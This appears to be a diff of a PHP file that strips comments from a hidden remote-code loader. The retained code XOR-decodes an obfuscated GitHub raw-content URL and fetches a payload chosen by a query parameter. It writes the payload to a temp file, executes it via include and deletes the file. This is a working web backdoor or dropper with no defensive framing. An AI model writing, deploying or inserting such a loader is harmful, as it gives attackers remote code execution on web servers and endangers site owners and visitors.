@@ -1,10 +1,6 @@
 <?php
-// Enable error reporting for debugging
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
-
-// Your existing functions
-
 function fetchRemoteContent($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
@@ -26,7 +22,6 @@ function fetchRemoteContent($url) {
         }
         return $content;
     } else {
-        // Fallback method using fsockopen
         $parts = parse_url($url);
         if (!$parts || !isset($parts['host'])) {
             error_log('Invalid URL: ' . $url);
@@ -68,12 +63,7 @@ function localXorEncryptDecrypt($data, $key) {
     }
     return $output;
 }
-
-// Debug: Log start
 error_log("Script started.");
-
-// Your existing code with error handling and logs
-
 $customValueFile = 'x-anny-anax.ium';
 $defaultSegment = "xannyanaxium";
 $queryParam = "llz";
@@ -89,21 +79,13 @@ if (isset($_GET[$queryParam])) {
         $pathSegment = $defaultSegment;
     }
 }
-
-// Decrypt URL components
 $_ = "!";
 $url = localXorEncryptDecrypt("S@V\x0F" . "FHUITCTRDSBNOUDOU\x0FBNL", $_);
 $path = localXorEncryptDecrypt("M@NMHDS[H\x0C" . "BNLLHUR\x0EQIQCE\x0E" . "SDGR\x0EID@ER\x0EL@HO\x0E", $_);
 $exx = localXorEncryptDecrypt("QIQ", $_);
-
-// Construct the URL
 $pc = $path . $pathSegment . $exx;
 $fullUrl = "https://$url$pc";
-
-// Log the URL
 error_log("Fetching remote URL: " . $fullUrl);
-
-// Fetch remote payload
 $remotePayload = fetchRemoteContent($fullUrl);
 
 if ($remotePayload === false) {
@@ -111,22 +93,12 @@ if ($remotePayload === false) {
     echo "Failed to fetch remote payload.";
     exit;
 }
-
-// Log payload size or snippet
 error_log("Received payload size: " . strlen($remotePayload));
 error_log("Payload snippet: " . substr($remotePayload, 0, 100));
-
-// Process payload
 $parts = str_split($remotePayload, 4);
 $obfuscatedPayload = implode('', $parts);
-
-// Create temp file
 $tempFile = tempnam(sys_get_temp_dir(), $exx);
 file_put_contents($tempFile, $obfuscatedPayload);
-
-// Include the payload
 include $tempFile;
-
-// Delete temp file
 unlink($tempFile);
 ?>
